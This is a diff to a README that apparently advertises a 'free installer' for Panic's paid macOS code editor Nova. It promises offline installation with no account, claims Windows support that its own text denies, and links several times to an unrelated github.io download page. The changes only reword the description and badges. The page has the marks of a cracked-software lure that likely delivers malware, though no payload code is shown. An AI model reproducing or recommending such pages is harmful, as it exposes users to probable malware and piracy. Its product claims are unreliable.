@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Text+Editor-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Code+Editor-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Nova (Panic) Free Installer** — Nova is a native macOS code editor from Panic Inc., makers of Transmit and Coda. Works without internet access, no account required. Full offline installation.
+**💻 Nova (Panic) Free Installer** — Nova is Panic's modern macOS code editor, the successor to Coda. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Nova (Panic)](https://img.shields.io/badge/⬇_Install_Nova%20(Panic)-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Nova (Panic)](https://img.shields.io/badge/⬇_Install_Nova+(Panic)-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Nova (Panic)
 
-Nova is a native macOS code editor from Panic Inc., makers of Transmit and Coda. It provides a fast, fully native editor with syntax highlighting, extensions, built-in FTP/SFTP client, Git integration, and a beautiful macOS-native interface.
+Nova is Panic's modern macOS code editor, the successor to Coda. Built with a native macOS interface, Nova features a fast tree-sitter-based syntax engine, a built-in terminal, local and remote file management, extensions, and first-class support for web development technologies. Nova is designed exclusively for macOS, taking full advantage of the platform for a polished native editing experience.
 
 ---
 
 ## ❌ Problem: Nova (Panic) is hard to access
 
-- **macOS Only** — No Windows or Linux version; iOS version is Kodex
-- **Paid Subscription** — Requires ongoing subscription after initial purchase
-- **Smaller Extension Market** — Fewer extensions than VS Code
-- **Niche Market** — macOS-only positioning limits adoption compared to cross-platform editors
+- **macOS Only** — No Windows or Linux version by design
+- **Commercial License** — Paid application with annual or one-time purchase
+- **Extension Ecosystem** — Smaller than VS Code extension marketplace
+- **Remote Development** — Remote SSH development less seamless than VS Code Remote
 
 ---
 
@@ -81,7 +81,7 @@ Nova is a native macOS code editor from Panic Inc., makers of Transmit and Coda.
 
 <div align="center">
 
-[![⬇ Install Nova (Panic)](https://img.shields.io/badge/⬇_Install_Nova%20(Panic)-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Nova (Panic)](https://img.shields.io/badge/⬇_Install_Nova+(Panic)-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Nova is a native macOS code editor from Panic Inc., makers of Transmit and Coda.
 
 ---
 
-**Nova (Panic) Free Installer** — Nova is a native macOS code editor from Panic Inc., makers of Transmit and Coda. Install without internet connection today!
+**Nova (Panic) Free Installer** — Nova is Panic's modern macOS code editor, the successor to Coda. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Nova (Panic)](https://img.shields.io/badge/⬇_Install_Nova%20(Panic)-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Nova (Panic)](https://img.shields.io/badge/⬇_Install_Nova+(Panic)-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
